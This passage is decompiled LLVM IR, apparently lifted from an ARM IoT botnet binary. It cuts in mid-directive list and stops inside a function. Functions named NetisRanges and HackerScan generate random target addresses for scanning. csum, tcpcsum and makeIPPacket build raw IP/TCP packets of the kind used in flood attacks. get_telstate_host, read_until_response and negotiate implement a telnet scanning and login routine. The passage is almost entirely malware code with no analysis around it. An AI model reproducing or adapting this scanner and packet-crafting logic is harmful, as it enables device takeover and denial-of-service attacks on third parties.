  uselistorder label %dec_label_pc_c808, { 1, 0 }
  uselistorder label %dec_label_pc_c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_c7a0, { 1, 0 }
  uselistorder label %dec_label_pc_c76c, { 1, 0 }
  uselistorder label %dec_label_pc_c738, { 1, 0 }
  uselistorder label %dec_label_pc_c704, { 1, 0 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c69c, { 1, 0 }
  uselistorder label %dec_label_pc_c668, { 1, 0 }
  uselistorder label %dec_label_pc_c634, { 1, 0 }
  uselistorder label %dec_label_pc_c600, { 1, 0 }
  uselistorder label %dec_label_pc_c5cc, { 1, 0 }
  uselistorder label %dec_label_pc_c598, { 1, 0 }
  uselistorder label %dec_label_pc_c564, { 1, 0 }
  uselistorder label %dec_label_pc_c530, { 1, 0 }
  uselistorder label %dec_label_pc_c4fc, { 1, 0 }
  uselistorder label %dec_label_pc_c4c8, { 1, 0 }
  uselistorder label %dec_label_pc_c494, { 1, 0 }
  uselistorder label %dec_label_pc_c460, { 1, 0 }
  uselistorder label %dec_label_pc_c42c, { 1, 0 }
  uselistorder label %dec_label_pc_c3f8, { 1, 0 }
  uselistorder label %dec_label_pc_c3c4, { 1, 0 }
  uselistorder label %dec_label_pc_c390, { 1, 0 }
  uselistorder label %dec_label_pc_c35c, { 1, 0 }
  uselistorder label %dec_label_pc_c328, { 1, 0 }
  uselistorder label %dec_label_pc_c2f4, { 1, 0 }
  uselistorder label %dec_label_pc_c2c0, { 1, 0 }
  uselistorder label %dec_label_pc_c28c, { 1, 0 }
  uselistorder label %dec_label_pc_c258, { 1, 0 }
  uselistorder label %dec_label_pc_c224, { 1, 0 }
  uselistorder label %dec_label_pc_c1f0, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c188, { 1, 0 }
  uselistorder label %dec_label_pc_c154, { 1, 0 }
  uselistorder label %dec_label_pc_c120, { 1, 0 }
  uselistorder label %dec_label_pc_c0ec, { 1, 0 }
  uselistorder label %dec_label_pc_c0b8, { 1, 0 }
  uselistorder label %dec_label_pc_c084, { 1, 0 }
  uselistorder label %dec_label_pc_c050, { 1, 0 }
  uselistorder label %dec_label_pc_c01c, { 1, 0 }
  uselistorder label %dec_label_pc_bfe8, { 1, 0 }
  uselistorder label %dec_label_pc_bfb4, { 1, 0 }
  uselistorder label %dec_label_pc_bf80, { 1, 0 }
  uselistorder label %dec_label_pc_bf4c, { 1, 0 }
  uselistorder label %dec_label_pc_bf18, { 1, 0 }
  uselistorder label %dec_label_pc_bee4, { 1, 0 }
  uselistorder label %dec_label_pc_beb0, { 1, 0 }
  uselistorder label %dec_label_pc_be7c, { 1, 0 }
  uselistorder label %dec_label_pc_be48, { 1, 0 }
  uselistorder label %dec_label_pc_be14, { 1, 0 }
  uselistorder label %dec_label_pc_bde0, { 1, 0 }
  uselistorder label %dec_label_pc_bdac, { 1, 0 }
  uselistorder label %dec_label_pc_bd78, { 1, 0 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bd10, { 1, 0 }
  uselistorder label %dec_label_pc_bcdc, { 1, 0 }
  uselistorder label %dec_label_pc_bca8, { 1, 0 }
  uselistorder label %dec_label_pc_bc74, { 1, 0 }
  uselistorder label %dec_label_pc_bc40, { 1, 0 }
  uselistorder label %dec_label_pc_bc0c, { 1, 0 }
  uselistorder label %dec_label_pc_bbd8, { 1, 0 }
  uselistorder label %dec_label_pc_bba4, { 1, 0 }
  uselistorder label %dec_label_pc_bb70, { 1, 0 }
  uselistorder label %dec_label_pc_bb3c, { 1, 0 }
  uselistorder label %dec_label_pc_bb08, { 1, 0 }
  uselistorder label %dec_label_pc_bad4, { 1, 0 }
  uselistorder label %dec_label_pc_baa0, { 1, 0 }
  uselistorder label %dec_label_pc_ba6c, { 1, 0 }
  uselistorder label %dec_label_pc_ba38, { 1, 0 }
  uselistorder label %dec_label_pc_ba04, { 1, 0 }
  uselistorder label %dec_label_pc_b784, { 1, 0 }
  uselistorder label %dec_label_pc_b750, { 1, 0 }
  uselistorder label %dec_label_pc_b71c, { 1, 0 }
  uselistorder label %dec_label_pc_b6e8, { 1, 0 }
  uselistorder label %dec_label_pc_b6b4, { 1, 0 }
  uselistorder label %dec_label_pc_b680, { 1, 0 }
  uselistorder label %dec_label_pc_b64c, { 1, 0 }
  uselistorder label %dec_label_pc_b618, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5b0, { 1, 0 }
  uselistorder label %dec_label_pc_b57c, { 1, 0 }
  uselistorder label %dec_label_pc_b548, { 1, 0 }
  uselistorder label %dec_label_pc_b514, { 1, 0 }
  uselistorder label %dec_label_pc_b4e0, { 1, 0 }
  uselistorder label %dec_label_pc_b4ac, { 1, 0 }
  uselistorder label %dec_label_pc_b478, { 1, 0 }
  uselistorder label %dec_label_pc_b444, { 1, 0 }
  uselistorder label %dec_label_pc_b410, { 1, 0 }
  uselistorder label %dec_label_pc_b3dc, { 1, 0 }
  uselistorder label %dec_label_pc_b3a8, { 1, 0 }
  uselistorder label %dec_label_pc_b374, { 1, 0 }
  uselistorder label %dec_label_pc_b340, { 1, 0 }
  uselistorder label %dec_label_pc_b30c, { 1, 0 }
  uselistorder label %dec_label_pc_b2d8, { 1, 0 }
  uselistorder label %dec_label_pc_b2a4, { 1, 0 }
  uselistorder label %dec_label_pc_b270, { 1, 0 }
  uselistorder label %dec_label_pc_b23c, { 1, 0 }
  uselistorder label %dec_label_pc_b208, { 1, 0 }
  uselistorder label %dec_label_pc_b1d4, { 1, 0 }
  uselistorder label %dec_label_pc_b1a0, { 1, 0 }
  uselistorder label %dec_label_pc_b16c, { 1, 0 }
  uselistorder label %dec_label_pc_b138, { 1, 0 }
  uselistorder label %dec_label_pc_b104, { 1, 0 }
  uselistorder label %dec_label_pc_b0d0, { 1, 0 }
  uselistorder label %dec_label_pc_b09c, { 1, 0 }
  uselistorder label %dec_label_pc_b068, { 1, 0 }
  uselistorder label %dec_label_pc_b034, { 1, 0 }
  uselistorder label %dec_label_pc_b000, { 1, 0 }
  uselistorder label %dec_label_pc_afcc, { 1, 0 }
  uselistorder label %dec_label_pc_af98, { 1, 0 }
  uselistorder label %dec_label_pc_af64, { 1, 0 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_aefc, { 1, 0 }
  uselistorder label %dec_label_pc_aec8, { 1, 0 }
  uselistorder label %dec_label_pc_ae94, { 1, 0 }
  uselistorder label %dec_label_pc_ae60, { 1, 0 }
  uselistorder label %dec_label_pc_ae2c, { 1, 0 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
  uselistorder label %dec_label_pc_adc4, { 1, 0 }
  uselistorder label %dec_label_pc_ad90, { 1, 0 }
  uselistorder label %dec_label_pc_ad5c, { 1, 0 }
  uselistorder label %dec_label_pc_ad28, { 1, 0 }
  uselistorder label %dec_label_pc_acf4, { 1, 0 }
  uselistorder label %dec_label_pc_acc0, { 1, 0 }
  uselistorder label %dec_label_pc_ac8c, { 1, 0 }
  uselistorder label %dec_label_pc_ac58, { 1, 0 }
  uselistorder label %dec_label_pc_ac24, { 1, 0 }
  uselistorder label %dec_label_pc_abf0, { 1, 0 }
  uselistorder label %dec_label_pc_abbc, { 1, 0 }
  uselistorder label %dec_label_pc_ab88, { 1, 0 }
  uselistorder label %dec_label_pc_ab54, { 1, 0 }
  uselistorder label %dec_label_pc_ab20, { 1, 0 }
  uselistorder label %dec_label_pc_aaec, { 1, 0 }
  uselistorder label %dec_label_pc_aab8, { 1, 0 }
  uselistorder label %dec_label_pc_aa84, { 1, 0 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %dec_label_pc_aa1c, { 1, 0 }
  uselistorder label %dec_label_pc_a9e8, { 1, 0 }
  uselistorder label %dec_label_pc_a9b4, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d750 = load i32, i32* @r4, align 4
  %v6_d750 = load i32, i32* @fp, align 4
  %v13_d750 = load i32, i32* @lr, align 4
  store i32 55128, i32* %stack_var_-4, align 4
  %v2_d754 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d754, i32* @fp, align 4
  %v0_d75c = call i32 @rand()
  %v1_d76c = zext i32 %v0_d75c to i64
  %v4_d76c = mul nuw i64 %v1_d76c, 2290649225
  %v3_d7703 = udiv i64 %v4_d76c, 68719476736
  %v2_d77c5 = mul nuw nsw i64 %v3_d7703, 2
  %v2_d77c = trunc i64 %v2_d77c5 to i32
  %v3_d7807 = mul nuw nsw i64 %v3_d7703, 32
  %v3_d780 = trunc i64 %v3_d7807 to i32
  %v2_d7849 = sub i32 %v2_d77c, %v3_d780
  %v2_d788 = add i32 %v2_d7849, %v0_d75c
  %v4_d7a0 = mul i32 %v2_d788, 4
  %v5_d7a0 = add i32 %v4_d7a0, ptrtoint (i32* @global_var_32224.481 to i32)
  %v6_d7a0 = inttoptr i32 %v5_d7a0 to i32*
  %v7_d7a0 = load i32, i32* %v6_d7a0, align 4
  %v1_d7ac = trunc i32 %v7_d7a0 to i8
  store i8 %v1_d7ac, i8* @global_var_324df.73, align 1
  %v0_d7b0 = call i32 @rand()
  %v2_d7cc = sdiv i32 %v0_d7b0, 51
  %tmp26 = mul i32 %v2_d7cc, -255
  %v2_d7e4 = add i32 %tmp26, %v0_d7b0
  %v1_d7f8 = trunc i32 %v2_d7e4 to i8
  store i8 %v1_d7f8, i8* @global_var_324e0.74, align 1
  %v0_d7fc = call i32 @rand()
  %v2_d818 = sdiv i32 %v0_d7fc, 51
  %tmp27 = mul i32 %v2_d818, -255
  %v2_d830 = add i32 %tmp27, %v0_d7fc
  %v1_d844 = trunc i32 %v2_d830 to i8
  store i8 %v1_d844, i8* @global_var_324e1.75, align 1
  %v0_d848 = call i32 @rand()
  %v2_d864 = sdiv i32 %v0_d848, 51
  %tmp28 = mul i32 %v2_d864, -255
  %v2_d87c = add i32 %tmp28, %v0_d848
  %v1_d890 = trunc i32 %v2_d87c to i8
  store i8 %v1_d890, i8* @global_var_324e2.76, align 1
  %v2_d894 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d8d0 = load i8, i8* bitcast (i8** @global_var_324de.72 to i8*), align 4
  %v3_d8d0 = zext i8 %v2_d8d0 to i32
  store i32 %v3_d8d0, i32* @lr, align 4
  %v3_d8dc = load i8, i8* @global_var_324df.73, align 1
  %v4_d8dc = zext i8 %v3_d8dc to i32
  store i32 %v4_d8dc, i32* @r4, align 4
  %v3_d8e8 = load i8, i8* @global_var_324e0.74, align 1
  %v6_d910 = sext i8 %v3_d8dc to i32
  %v8_d910 = sext i8 %v3_d8e8 to i32
  %v9_d910 = call i32 @szprintf(i32 %v2_d894, i32 ptrtoint ([12 x i8]* @global_var_246a8.485 to i32), i32 %v3_d8d0, i32 %v6_d910, i32 %v8_d910)
  store i32 %v2_d894, i32* @r0, align 4
  %v1_d91c = call i32 @inet_addr(i32 %v2_d894)
  store i32 %v3_d750, i32* @r4, align 4
  store i32 %v6_d750, i32* @fp, align 4
  store i32 %v13_d750, i32* @lr, align 4
  ret i32 %v1_d91c

; uselistorder directives
  uselistorder i32 %v2_d894, { 2, 1, 0 }
  uselistorder i32 %v0_d848, { 1, 0 }
  uselistorder i32 %v0_d7fc, { 1, 0 }
  uselistorder i32 %v0_d7b0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_324e2.76, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_324e1.75, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_324e0.74, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_324df.73, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d960 = load i32, i32* @global_var_391e8.487, align 4
  %v1_d968 = call i32 @__GI_ntohl(i32 %v2_d960)
  %v2_d974 = and i32 %v1_d968, %arg1
  %v0_d97c = call i32 @rand_cmwc()
  %v1_d988 = sub i32 -1, %arg1
  %v2_d98c = and i32 %v0_d97c, %v1_d988
  %v2_d994 = xor i32 %v2_d98c, %v2_d974
  ret i32 %v2_d994
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_da209 = icmp sgt i32 %arg2, 1
  br i1 %v8_da209, label %dec_label_pc_d9d8, label %dec_label_pc_da24

dec_label_pc_d9d8:                                ; preds = %entry, %dec_label_pc_d9d8
  %v2_d9ec = phi i32 [ %v2_d9f0, %dec_label_pc_d9d8 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_d9f4, %dec_label_pc_d9d8 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_da10, %dec_label_pc_d9d8 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_da08, %dec_label_pc_d9d8 ], [ %arg1, %entry ]
  %v4_d9d8 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_d9dc = load i16, i16* %stack_var_-36.010, align 2
  %v3_d9dc = zext i16 %v2_d9dc to i32
  %v2_d9f0 = add i32 %v3_d9dc, %v2_d9ec
  %v3_d9f0 = icmp ult i32 %v2_d9f0, %v2_d9ec
  %v4_d9f4 = zext i1 %v3_d9f0 to i32
  %v5_d9f4 = add i32 %v4_d9f4, %stack_var_-44.012
  %v1_da04 = add i32 %v4_d9d8, 2
  %v5_da08 = inttoptr i32 %v1_da04 to i16*
  %v1_da10 = add nsw i32 %stack_var_-40.011, -2
  %v8_da20 = icmp sgt i32 %v1_da10, 1
  br i1 %v8_da20, label %dec_label_pc_d9d8, label %dec_label_pc_da18.dec_label_pc_da24_crit_edge

dec_label_pc_da18.dec_label_pc_da24_crit_edge:    ; preds = %dec_label_pc_d9d8
  br label %dec_label_pc_da24

dec_label_pc_da24:                                ; preds = %dec_label_pc_da18.dec_label_pc_da24_crit_edge, %entry
  %v2_da44 = phi i32 [ %v2_d9f0, %dec_label_pc_da18.dec_label_pc_da24_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_da08, %dec_label_pc_da18.dec_label_pc_da24_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_d9f4, %dec_label_pc_da18.dec_label_pc_da24_crit_edge ], [ 0, %entry ]
  %v7_da1c.lcssa.in = phi i32 [ %v1_da10, %dec_label_pc_da18.dec_label_pc_da24_crit_edge ], [ %arg2, %entry ]
  %v7_da1c.lcssa = icmp eq i32 %v7_da1c.lcssa.in, 1
  br i1 %v7_da1c.lcssa, label %dec_label_pc_da30, label %dec_label_pc_daac.preheader

dec_label_pc_da30:                                ; preds = %dec_label_pc_da24
  %v1_da34 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_da34 = load i8, i8* %v1_da34, align 1
  %v3_da34 = zext i8 %v2_da34 to i32
  %v2_da48 = add i32 %v3_da34, %v2_da44
  %v3_da48 = icmp ult i32 %v2_da48, %v2_da44
  %v4_da4c = zext i1 %v3_da48 to i32
  %v5_da4c = add i32 %v4_da4c, %stack_var_-44.0.lcssa
  br label %dec_label_pc_daac.preheader

dec_label_pc_daac.preheader:                      ; preds = %dec_label_pc_da30, %dec_label_pc_da24
  %v3_dad8.ph = phi i32 [ %v2_da44, %dec_label_pc_da24 ], [ %v2_da48, %dec_label_pc_da30 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_da24 ], [ %v5_da4c, %dec_label_pc_da30 ]
  %v3_dab037 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_dab838 = udiv i32 %v3_dad8.ph, 65536
  %v2_dabc39 = or i32 %v3_dab037, %v3_dab838
  %v3_dac440 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_dacc41 = or i32 %v2_dabc39, %v3_dac440
  %v2_dad042 = icmp eq i32 %v2_dacc41, 0
  br i1 %v2_dad042, label %dec_label_pc_dad8, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %dec_label_pc_daac.preheader, %dec_label_pc_da5c
  %v3_dac445 = phi i32 [ %v3_dac4, %dec_label_pc_da5c ], [ %v3_dac440, %dec_label_pc_daac.preheader ]
  %v2_dabc44 = phi i32 [ %v2_dabc, %dec_label_pc_da5c ], [ %v2_dabc39, %dec_label_pc_daac.preheader ]
  %v3_dad843 = phi i32 [ %v2_da9c, %dec_label_pc_da5c ], [ %v3_dad8.ph, %dec_label_pc_daac.preheader ]
  %v2_da70 = urem i32 %v3_dad843, 65536
  %v2_da9c = add i32 %v2_dabc44, %v2_da70
  %v3_da9c = icmp ult i32 %v2_da9c, %v2_da70
  %v4_daa0 = zext i1 %v3_da9c to i32
  %v5_daa0 = add nuw nsw i32 %v4_daa0, %v3_dac445
  %v3_dab0 = mul i32 %v5_daa0, 65536
  %v3_dab8 = udiv i32 %v2_da9c, 65536
  %v2_dabc = or i32 %v3_dab0, %v3_dab8
  %v3_dac4 = udiv i32 %v5_daa0, 65536
  %v2_dacc = or i32 %v2_dabc, %v3_dac4
  %v2_dad0 = icmp eq i32 %v2_dacc, 0
  br i1 %v2_dad0, label %dec_label_pc_daac.dec_label_pc_dad8_crit_edge, label %dec_label_pc_da5c

dec_label_pc_daac.dec_label_pc_dad8_crit_edge:    ; preds = %dec_label_pc_da5c
  br label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_daac.dec_label_pc_dad8_crit_edge, %dec_label_pc_daac.preheader
  %v3_dad8.lcssa = phi i32 [ %v2_da9c, %dec_label_pc_daac.dec_label_pc_dad8_crit_edge ], [ %v3_dad8.ph, %dec_label_pc_daac.preheader ]
  %v1_dae4 = urem i32 %v3_dad8.lcssa, 65536
  %v3_daec = xor i32 %v1_dae4, 65535
  ret i32 %v3_daec

; uselistorder directives
  uselistorder i32 %v2_dabc, { 1, 0 }
  uselistorder i32 %v5_daa0, { 1, 0 }
  uselistorder i32 %v2_da9c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_dac440, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_dad8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_da44, { 0, 2, 1 }
  uselistorder i32 %v1_da10, { 0, 2, 1 }
  uselistorder i32 %v2_d9f0, { 0, 2, 1 }
  uselistorder i32 %v2_d9ec, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_da5c, { 1, 0 }
  uselistorder label %dec_label_pc_d9d8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_db04 = load i32, i32* @fp, align 4
  store i32 56076, i32* %stack_var_-4, align 4
  %v2_db08 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_db08, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_db28 = add i32 %arg1, 12
  %v2_db28 = inttoptr i32 %v1_db28 to i32*
  %v3_db28 = load i32, i32* %v2_db28, align 4
  store i32 %v3_db28, i32* %stack_var_-44, align 4
  %v1_db50 = call i32 @__GI_htons(i32 20)
  %v1_db6c = call i32 @malloc(i32 32)
  %v2_db78 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_db78, i32* @r3, align 4
  store i32 %v1_db6c, i32* @r0, align 4
  store i32 %v2_db78, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_db88 = call i32 @memcpy()
  %v1_db90 = add i32 %v1_db6c, 12
  store i32 %v1_db90, i32* @r3, align 4
  store i32 %v1_db90, i32* @r0, align 4
  %v3_db98 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_db98, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_dba0 = call i32 @memcpy()
  %v2_dbac = inttoptr i32 %v1_db6c to i16*
  %v3_dbac = call i32 @csum(i16* %v2_dbac, i32 32)
  %sext = mul i32 %v3_dbac, 65536
  %v1_dbb0 = sdiv i32 %sext, 65536
  store i32 %v1_db6c, i32* @r0, align 4
  %v0_dbbc = call i32 @free()
  %v4_dbc0 = urem i32 %v1_dbb0, 65536
  store i32 %v3_db04, i32* @fp, align 4
  ret i32 %v4_dbc0

; uselistorder directives
  uselistorder i32 %v1_db6c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dbd8 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dc44 = add i32 %tmp3, 1
  %v4_dc44 = inttoptr i32 %v3_dc44 to i8*
  store i8 0, i8* %v4_dc44, align 1
  %v3_dc48 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_dc48, 20
  %v1_dc64 = trunc i32 %fold to i16
  %v3_dc64 = add i32 %tmp3, 2
  %v4_dc64 = inttoptr i32 %v3_dc64 to i16*
  store i16 %v1_dc64, i16* %v4_dc64, align 2
  %v0_dc68 = call i32 @rand_cmwc()
  %v1_dc7c = trunc i32 %v0_dc68 to i16
  %v3_dc7c = add i32 %tmp3, 4
  %v4_dc7c = inttoptr i32 %v3_dc7c to i16*
  store i16 %v1_dc7c, i16* %v4_dc7c, align 2
  %v3_dc88 = add i32 %tmp3, 6
  %v4_dc88 = inttoptr i32 %v3_dc88 to i16*
  store i16 0, i16* %v4_dc88, align 2
  %v3_dc94 = add i32 %tmp3, 8
  %v4_dc94 = inttoptr i32 %v3_dc94 to i8*
  store i8 -1, i8* %v4_dc94, align 1
  %v3_dca0 = add i32 %tmp3, 9
  %v4_dca0 = inttoptr i32 %v3_dca0 to i8*
  store i8 %tmp, i8* %v4_dca0, align 1
  %v3_dcac = add i32 %tmp3, 10
  %v4_dcac = inttoptr i32 %v3_dcac to i16*
  store i16 0, i16* %v4_dcac, align 2
  %v2_dcb8 = add i32 %tmp3, 12
  %v3_dcb8 = inttoptr i32 %v2_dcb8 to i32*
  store i32 %arg3, i32* %v3_dcb8, align 4
  %v2_dcc4 = add i32 %tmp3, 16
  %v3_dcc4 = inttoptr i32 %v2_dcc4 to i32*
  store i32 %arg2, i32* %v3_dcc4, align 4
  store i32 %v3_dbd8, i32* @fp, align 4
  ret i32 %v0_dc68
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_dcf0 = icmp sgt i32 %arg1, 2
  br i1 %v8_dcf0, label %dec_label_pc_dd00, label %dec_label_pc_dd10

dec_label_pc_dd00:                                ; preds = %entry
  %v1_dd04 = call i32 @__GI___libc_close(i32 %arg1)
  br label %dec_label_pc_dd10

dec_label_pc_dd10:                                ; preds = %entry, %dec_label_pc_dd00
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dd00 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_dd10, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_dd28 = load i32, i32* @fp, align 4
  store i32 56624, i32* %stack_var_-4, align 4
  %v2_dd2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd2c, i32* @fp, align 4
  %v1_dd3c = add i32 %arg1, 4
  %v2_dd3c = inttoptr i32 %v1_dd3c to i32*
  %v3_dd3c = load i32, i32* %v2_dd3c, align 4
  store i32 %v3_dd3c, i32* @r0, align 4
  %v1_dd48 = call i32 @__GI_inet_ntoa(i32 %v3_dd3c)
  store i32 %v3_dd28, i32* @fp, align 4
  ret i32 %v1_dd48

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_dd64 = load i32, i32* @fp, align 4
  store i32 56684, i32* %stack_var_-4, align 4
  %v2_dd68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd68, i32* @fp, align 4
  %v5_dd90 = call i32 @__GI_memset(i8* %arg3, i32 0, i32 %arg4)
  %v5_dda4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_ddb4 = load i8, i8* %arg3, align 1
  %v2_ddb8 = icmp eq i8 %v2_ddb4, -1
  br i1 %v2_ddb8, label %dec_label_pc_ddc0, label %dec_label_pc_ddd4

dec_label_pc_ddc0:                                ; preds = %entry
  %v4_ddd0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_ddd4

dec_label_pc_ddd4:                                ; preds = %entry, %dec_label_pc_ddc0
  %v3_ddd8 = load i32, i32* %stack_var_0, align 4
  %v3_dddc = call i32 @contains_string(i32 %tmp, i32 %v3_ddd8)
  %v2_dde4 = icmp ne i32 %v3_dddc, 0
  %. = zext i1 %v2_dde4 to i32
  store i32 %v3_dd64, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_ddd4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de58.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_de18 = load i32, i32* @fp, align 4
  store i32 %v3_de18, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_de44 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_de58

dec_label_pc_de58:                                ; preds = %dec_label_pc_de58.lr.ph, %dec_label_pc_de58
  %storemerge25 = phi i32 [ 0, %dec_label_pc_de58.lr.ph ], [ %v1_de6c, %dec_label_pc_de58 ]
  %v5_de64 = mul nuw nsw i32 %storemerge25, 4
  %v6_de64 = add i32 %v5_de64, %v2_de44
  %v7_de64 = inttoptr i32 %v6_de64 to i32*
  store i32 0, i32* %v7_de64, align 4
  %v1_de6c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_de6c, 32
  br i1 %tmp21, label %dec_label_pc_de58, label %dec_label_pc_de80

